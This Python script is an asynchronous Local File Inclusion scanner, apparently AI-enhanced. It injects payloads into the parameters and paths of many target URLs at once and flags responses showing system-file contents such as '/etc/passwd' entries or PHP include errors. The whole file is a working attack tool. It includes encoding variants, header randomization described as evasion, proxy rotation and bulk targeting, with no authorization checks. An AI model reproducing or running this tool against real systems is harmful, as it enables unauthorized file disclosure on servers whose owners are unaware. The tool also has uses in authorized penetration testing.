#!/usr/bin/env python3
"""
Author: rioocns + enhanced by PentestGPT
Description: Robust Advanced Local File Inclusion (LFI) scanner with multi-URL support.
"""

import argparse
import asyncio
import logging
import os
import random
import re
import sqlite3
import sys
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Union
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import aiohttp
import pdfkit # type: ignore
import requests # type: ignore
from colorama import Fore, Style, init # type: ignore
from sklearn.feature_extraction.text import TfidfVectorizer # type: ignore
from sklearn.metrics.pairwise import cosine_similarity # type: ignore

# === Initialize colorama ===
init(autoreset=True)

# === Constants ===
LFI_SIGNATURES = [
    "root:x:0:0", "daemon:", "sbin/nologin", "[boot loader]", "[fonts]",
    "DOCUMENT_ROOT", "nologin", "<?php", "PATH=", "root:", "bin/bash",
]

LFI_REGEX_SIGNATURES = [
    re.compile(r"Warning: include\(.+?\)"),
    re.compile(r"Warning: require\(.+?\)"),
    re.compile(r"failed to open stream: No such file or directory"),
    re.compile(r"Fatal error: include\(.+?\)"),
    re.compile(r"Warning: file_get_contents\(.+?\)"),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
]

REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://www.facebook.com/",
    "https://www.twitter.com/",
]

DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "close",
    "Upgrade-Insecure-Requests": "1"
}

RESPONSE_DIR = "lfi_responses"
LOG_FILE = "lfi_scan.log"
DB_FILE = "scan_db.sqlite"
HTML_REPORT = "lfi_report.html"
PDF_REPORT = "lfi_report.pdf"

MAX_RETRIES = 3
RETRY_DELAY = 2
MAX_WORKERS_DEFAULT = 50
DELAY_MIN = 0.5
DELAY_MAX = 1.5
BACKOFF_BASE = 2


logger = logging.getLogger("LFI_Scanner")
logger.setLevel(logging.DEBUG)
logger.handlers.clear()

formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

file_handler = logging.FileHandler(LOG_FILE, encoding='utf-8')
file_handler.setLevel(logging.DEBUG)
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)


def init_db() -> None:
    """Initialize SQLite DB with tables for scan results and audit logs."""
    with sqlite3.connect(DB_FILE) as conn:
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS scan_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                target_url TEXT NOT NULL,
                url TEXT NOT NULL,
                param TEXT,
                payload TEXT,
                status_code INTEGER,
                response_length INTEGER,
                lfi_signature TEXT,
                is_false_positive BOOLEAN DEFAULT 0,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS audit_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                action TEXT NOT NULL,
                user TEXT NOT NULL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()


def print_banner() -> None:
    banner = f"""{Fore.CYAN}
   ___      _______   _____    ____  ____       
  / _ \\    | ____\\ \\ / / _ \\  |  _ \\|  _ \\      
 | | | |   |  _|  \\ V / | | | | |_) | |_) |     
 | |_| |   | |___  | || |_| | |  __/|  _ <      
  \\___/    |_____| |_| \\___/  |_|   |_| \\_\\   v1.0
        LFI Scanner By rioocns 
{Style.RESET_ALL}"""
    print(banner)


def load_lines(filename: str) -> List[str]:
    """Load non-empty lines from a file."""
    if not os.path.isfile(filename):
        logger.error(f"File not found: {filename}")
        sys.exit(1)
    try:
        with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
        if not lines:
            logger.error(f"File {filename} is empty or has no valid lines.")
            sys.exit(1)
        return lines
    except Exception as e:
        logger.error(f"Failed to read file {filename}: {e}")
        sys.exit(1)


def generate_test_urls(url: str, payload: str, target_params: Optional[List[str]] = None) -> List[Tuple[str, str]]:
    """Generate URLs with payload injected into parameters or path."""
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    test_urls = []

    if query_params:
        params_to_inject = target_params if target_params else list(query_params.keys())
        for param in params_to_inject:
            if param not in query_params:
                continue
            modified_qs = query_params.copy()
            modified_qs[param] = [payload]
            new_query = urlencode(modified_qs, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment
            ))
            test_urls.append((param, new_url))
    else:
        # Inject payload in path
        path_payload = parsed.path.rstrip('/') + '/' + payload
        path_payload_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            path_payload,
            parsed.params,
            parsed.query,
            parsed.fragment
        ))
        test_urls.append(("path", path_payload_url))

        # Inject payload as 'file' param
        new_query = urlencode({"file": payload})
        param_payload_url = urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))
        test_urls.append(("file", param_payload_url))

    return test_urls


def detect_lfi_signature(response_text: str) -> Optional[str]:
    """Detect known LFI signatures or error messages in response."""
    for signature in LFI_SIGNATURES:
        if signature in response_text:
            return signature
    for regex in LFI_REGEX_SIGNATURES:
        if regex.search(response_text):
            return f"Regex match: {regex.pattern}"
    return None


def is_false_positive_ml(response: str, baseline: str, threshold: float = 0.85) -> bool:
    """Use TF-IDF cosine similarity to detect false positives."""
    try:
        vectorizer = TfidfVectorizer()
        vectors = vectorizer.fit_transform([response, baseline])
        similarity = cosine_similarity(vectors[0], vectors[1])[0][0]
        return similarity > threshold
    except Exception as e:
        logger.debug(f"ML false positive detection error: {e}")
        return False


def sanitize_filename(s: str, max_length: int = 100) -> str:
    """Sanitize string to be safe for filenames."""
    sanitized = re.sub(r'[^\w\-\.]', '_', s)
    return sanitized[:max_length]


def save_response_to_file(directory: str, kind: str, param: str, payload: str, response_text: str) -> None:
    """Save HTTP response content to a file for manual review."""
    safe_payload = sanitize_filename(payload)
    safe_param = sanitize_filename(param)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = os.path.join(directory, f"{kind}_{safe_param}_{safe_payload}_{timestamp}.txt")
    try:
        os.makedirs(directory, exist_ok=True)
        with open(filename, "w", encoding="utf-8", errors='ignore') as f:
            f.write(response_text)
        logger.debug(f"Response saved to {filename}")
    except Exception as e:
        logger.error(f"Failed to save response to {filename}: {e}")


def get_random_headers() -> Dict[str, str]:
    """Generate randomized HTTP headers for evasion."""
    headers = DEFAULT_HEADERS.copy()
    headers["User-Agent"] = random.choice(USER_AGENTS)
    headers["Referer"] = random.choice(REFERERS)
    headers["Cache-Control"] = "no-cache"
    headers["Pragma"] = "no-cache"
    return headers


def encode_payload(payload: str) -> List[str]:
    """Generate multiple encoded variants of the payload."""
    encoded_variants = [payload]
    try:
        encoded_variants.append(requests.utils.quote(payload))
        encoded_variants.append(requests.utils.quote(requests.utils.quote(payload)))
        encoded_variants.append(payload + "%00")
        encoded_variants.append(payload.replace("/", "%2F"))
        try:
            encoded_variants.append(payload.encode('utf-8').decode('latin1'))
        except Exception:
            pass
    except Exception:
        pass
    return list(set(encoded_variants))


async def fetch_baseline_response(session: aiohttp.ClientSession, url: str) -> str:
    """Fetch baseline response without payload for false positive comparison."""
    try:
        async with session.get(url) as response:
            return await response.text()
    except Exception as e:
        logger.error(f"Failed to fetch baseline for {url}: {e}")
        return ""


async def make_request(
    session: aiohttp.ClientSession,
    url: str,
    method: str = "GET",
    data: Optional[Dict] = None,
    proxy: Optional[Dict[str, str]] = None,
    timeout: int = 15,
    verify_ssl: bool = True,
    extra_headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
) -> aiohttp.ClientResponse:
    """Make HTTP request with retries and backoff."""
    headers = get_random_headers()
    if extra_headers:
        headers.update(extra_headers)

    backoff = RETRY_DELAY
    for attempt in range(1, MAX_RETRIES + 1):
        try:
            if method.upper() == "POST":
                response = await session.post(
                    url,
                    headers=headers,
                    data=data,
                    proxy=proxy.get('http') if proxy else None,
                    timeout=timeout,
                    ssl=verify_ssl,
                    cookies=cookies
                )
            else:
                response = await session.get(
                    url,
                    headers=headers,
                    proxy=proxy.get('http') if proxy else None,
                    timeout=timeout,
                    ssl=verify_ssl,
                    cookies=cookies
                )
            await asyncio.sleep(random.uniform(DELAY_MIN, DELAY_MAX))
            return response
        except Exception as e:
            logger.debug(f"Request error (attempt {attempt}/{MAX_RETRIES}) for {url}: {e}")
            if attempt < MAX_RETRIES:
                await asyncio.sleep(backoff)
                backoff *= BACKOFF_BASE
            else:
                raise


class ProxyRotator:
    """Simple proxy rotator with failure tracking."""
    def __init__(self, proxies: List[str]):
        self.proxies = proxies
        self.failed = set()
        self.index = 0

    def get_proxy(self) -> Optional[Dict[str, str]]:
        if not self.proxies:
            return None
        start_index = self.index
        while True:
            proxy = self.proxies[self.index]
            self.index = (self.index + 1) % len(self.proxies)
            if proxy not in self.failed:
                if not proxy.startswith(('http://', 'https://')):
                    proxy = f"http://{proxy}"
                logger.debug(f"Using proxy: {proxy}")
                return {"http": proxy, "https": proxy}
            if self.index == start_index:
                logger.warning("All proxies failed, not using proxy.")
                return None

    def mark_failed(self, proxy: Union[str, Dict[str, str]]) -> None:
        if isinstance(proxy, dict):
            proxy_url = proxy.get('http', proxy.get('https', ''))
        else:
            proxy_url = proxy
        self.failed.add(proxy_url)
        logger.debug(f"Proxy {proxy_url} marked as failed and blacklisted.")


async def scan_url_parameter(
    target_url: str,
    url: str,
    param: str,
    payload: str,
    proxy_rotator: Optional[ProxyRotator],
    timeout: int,
    save_response_flag: bool,
    verify_ssl: bool,
    extra_headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    use_post: bool = False,
) -> Optional[Dict]:
    """Scan a single URL parameter with given payloads and detect LFI."""
    async with aiohttp.ClientSession() as session:
        encoded_payloads = encode_payload(payload)

        for epayload in encoded_payloads:
            test_url = url
            if param != "path":
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                if param not in query_params or query_params[param] != [epayload]:
                    test_urls = generate_test_urls(url, epayload, target_params=[param])
                    if test_urls:
                        test_url = test_urls[0][1]

            proxy = proxy_rotator.get_proxy() if proxy_rotator else None
            proxy_str = proxy["http"] if proxy else None

            try:
                response = await make_request(
                    session,
                    test_url,
                    method="POST" if use_post else "GET",
                    proxy=proxy,
                    timeout=timeout,
                    verify_ssl=verify_ssl,
                    extra_headers=extra_headers,
                    cookies=cookies
                )
                response_text = await response.text()
                lfi_signature = detect_lfi_signature(response_text)

                result = {
                    "target_url": target_url,
                    "url": test_url,
                    "param": param,
                    "payload": epayload,
                    "status_code": response.status,
                    "response_length": len(response_text),
                    "lfi_signature": lfi_signature,
                    "proxy": proxy_str,
                    "timestamp": datetime.now().isoformat()
                }

                if lfi_signature:
                    baseline = await fetch_baseline_response(session, url)
                    if is_false_positive_ml(response_text, baseline):
                        result["is_false_positive"] = True
                        print(f"{Fore.GREEN}[FALSE POSITIVE] {test_url} | param: {param} | Signature: '{lfi_signature}'{Style.RESET_ALL}")
                    else:
                        result["is_false_positive"] = False
                        print(f"{Fore.RED}[LFI FOUND] {test_url} | param: {param} | Signature: '{lfi_signature}'{Style.RESET_ALL}")
                        if save_response_flag:
                            save_response_to_file(RESPONSE_DIR, "lfi", param, epayload, response_text)
                else:
                    result["is_false_positive"] = None
                    print(f"{Fore.GREEN}[NO LFI] {test_url} | param: {param}{Style.RESET_ALL}")

                return result

            except Exception as e:
                logger.error(f"Error scanning {test_url} with payload {epayload}: {e}")
                if proxy_rotator and proxy:
                    proxy_rotator.mark_failed(proxy)
                continue

    return None


async def scan_target(
    target_url: str,
    payloads: List[str],
    proxy_rotator: Optional[ProxyRotator],
    timeout: int,
    save_response_flag: bool,
    verify_ssl: bool,
    extra_headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    use_post: bool = False,
    max_workers: int = MAX_WORKERS_DEFAULT,
) -> List[Dict]:
    """Scan all payloads against a single target URL."""
    tasks = []
    results = []

    for payload in payloads:
        test_urls = generate_test_urls(target_url, payload)
        for param, test_url in test_urls:
            tasks.append(
                scan_url_parameter(
                    target_url,
                    test_url,
                    param,
                    payload,
                    proxy_rotator,
                    timeout,
                    save_response_flag,
                    verify_ssl,
                    extra_headers,
                    cookies,
                    use_post,
                )
            )

    semaphore = asyncio.Semaphore(max_workers)

    async def sem_task(task):
        async with semaphore:
            return await task

    wrapped_tasks = [sem_task(t) for t in tasks]
    batch_results = await asyncio.gather(*wrapped_tasks, return_exceptions=True)

    for result in batch_results:
        if isinstance(result, Exception):
            logger.error(f"Error in task: {result}")
        elif result:
            results.append(result)

    return results


async def scan_multiple_targets(
    target_urls: List[str],
    payloads: List[str],
    proxy_rotator: Optional[ProxyRotator],
    timeout: int,
    save_response_flag: bool,
   verify_ssl: bool,
    extra_headers: Optional[Dict[str, str]] = None,
    cookies: Optional[Dict[str, str]] = None,
    use_post: bool = False,
    max_workers: int = MAX_WORKERS_DEFAULT,
) -> List[Dict]:
    """Scan multiple target URLs concurrently."""
    all_results = []
    semaphore = asyncio.Semaphore(max_workers)

    async def sem_scan(target):
        async with semaphore:
            return await scan_target(
                target,
                payloads,
                proxy_rotator,
                timeout,
                save_response_flag,
                verify_ssl,
                extra_headers,
                cookies,
                use_post,
                max_workers=5  # limit concurrency per target
            )

    tasks = [sem_scan(url) for url in target_urls]
    results = await asyncio.gather(*tasks, return_exceptions=True)

    for res in results:
        if isinstance(res, Exception):
            logger.error(f"Error scanning target: {res}")
        elif res:
            all_results.extend(res)

    return all_results


def save_results_to_db(results: List[Dict]) -> None:
    """Save scan results to SQLite database."""
    if not results:
        return
    try:
        with sqlite3.connect(DB_FILE) as conn:
            cursor = conn.cursor()
            for r in results:
                cursor.execute("""
                    INSERT INTO scan_results (
                        target_url, url, param, payload, status_code,
                        response_length, lfi_signature, is_false_positive, timestamp
                    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (
                    r.get("target_url"),
                    r.get("url"),
                    r.get("param"),
                    r.get("payload"),
                    r.get("status_code"),
                    r.get("response_length"),
                    r.get("lfi_signature"),
                    int(r.get("is_false_positive") is True),
                    r.get("timestamp")
                ))
            conn.commit()
        logger.info(f"Saved {len(results)} results to database {DB_FILE}")
    except Exception as e:
        logger.error(f"Failed to save results to DB: {e}")


def generate_html_report(results: List[Dict], filename: str = HTML_REPORT) -> None:
    """Generate a simple HTML report from scan results."""
    try:
        html_content = """
        <html><head><title>LFI Scan Report</title>
        <style>
            body { font-family: Arial, sans-serif; }
            table { border-collapse: collapse; width: 100%; }
            th, td { border: 1px solid #ddd; padding: 8px; }
            th { background-color: #4CAF50; color: white; }
            tr:nth-child(even) { background-color: #f2f2f2; }
            .false-positive { background-color: #ffff99; }
            .lfi-found { background-color: #ff9999; }
        </style>
        </head><body>
        <h1>LFI Scan Report</h1>
        <table>
        <tr>
            <th>Target URL</th>
            <th>Tested URL</th>
            <th>Parameter</th>
            <th>Payload</th>
            <th>Status Code</th>
            <th>Response Length</th>
            <th>LFI Signature</th>
            <th>False Positive</th>
            <th>Timestamp</th>
        </tr>
        """

        for r in results:
            row_class = ""
            if r.get("is_false_positive") is True:
                row_class = "false-positive"
            elif r.get("lfi_signature") and r.get("is_false_positive") is False:
                row_class = "lfi-found"

            html_content += f"""
            <tr class="{row_class}">
                <td>{r.get("target_url")}</td>
                <td>{r.get("url")}</td>
                <td>{r.get("param")}</td>
                <td>{r.get("payload")}</td>
                <td>{r.get("status_code")}</td>
                <td>{r.get("response_length")}</td>
                <td>{r.get("lfi_signature") or ''}</td>
                <td>{'Yes' if r.get("is_false_positive") else 'No' if r.get("is_false_positive") == False else ''}</td>
                <td>{r.get("timestamp")}</td>
            </tr>
            """

        html_content += "</table></body></html>"

        with open(filename, "w", encoding="utf-8") as f:
            f.write(html_content)
        logger.info(f"HTML report saved to {filename}")
    except Exception as e:
        logger.error(f"Failed to generate HTML report: {e}")


def generate_pdf_report(html_file: str = HTML_REPORT, pdf_file: str = PDF_REPORT) -> None:
    """Generate PDF report from HTML file using pdfkit."""
    try:
        pdfkit.from_file(html_file, pdf_file)
        logger.info(f"PDF report saved to {pdf_file}")
    except Exception as e:
        logger.error(f"Failed to generate PDF report: {e}")


def parse_cookies(cookie_str: str) -> Dict[str, str]:
    """Parse cookie string into dictionary."""
    cookies = {}
    for pair in cookie_str.split(';'):
        if '=' in pair:
            k, v = pair.strip().split('=', 1)
            cookies[k] = v
    return cookies


def main():
    parser = argparse.ArgumentParser(description="Advanced LFI Scanner by rioocns Security Researcher")
    parser.add_argument("-u", "--url", help="Target URL (can be used multiple times)", action='append')
    parser.add_argument("-U", "--url-file", help="File containing list of target URLs")
    parser.add_argument("-p", "--payload-file", help="File containing LFI payloads", required=True)
    parser.add_argument("--proxy-file", help="File containing list of proxies (http://ip:port)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
    parser.add_argument("--save-response", action="store_true", help="Save HTTP responses containing LFI")
    parser.add_argument("--no-ssl-verify", action="store_true", help="Disable SSL certificate verification")
    parser.add_argument("--header", action="append", help="Custom HTTP header, format: HeaderName: value")
    parser.add_argument("--cookie", help="HTTP Cookie header value")
    parser.add_argument("--post", action="store_true", help="Use POST method instead of GET")
    parser.add_argument("--max-workers", type=int, default=MAX_WORKERS_DEFAULT, help="Max concurrent workers (default: 50)")
    args = parser.parse_args()

    if not args.url and not args.url_file:
        logger.error("You must specify at least one target URL (-u) or a URL file (-U).")
        sys.exit(1)

    target_urls = []
    if args.url:
        target_urls.extend(args.url)
    if args.url_file:
        target_urls.extend(load_lines(args.url_file))

    payloads = load_lines(args.payload_file)

    proxies = []
    if args.proxy_file:
        proxies = load_lines(args.proxy_file)
    proxy_rotator = ProxyRotator(proxies) if proxies else None

    extra_headers = {}
    if args.header:
        for h in args.header:
            if ':' in h:
                k, v = h.split(':', 1)
                extra_headers[k.strip()] = v.strip()

    cookies = parse_cookies(args.cookie) if args.cookie else None

    init_db()
    print_banner()

    loop = asyncio.get_event_loop()
    results = loop.run_until_complete(
        scan_multiple_targets(
            target_urls,
            payloads,
            proxy_rotator,
            args.timeout,
            args.save_response,
            not args.no_ssl_verify,
            extra_headers,
            cookies,
            args.post,
            args.max_workers
        )
    )

    save_results_to_db(results)
    generate_html_report(results)
    generate_pdf_report()

    logger.info("Scan completed.")


if __name__ == "__main__":
    main()
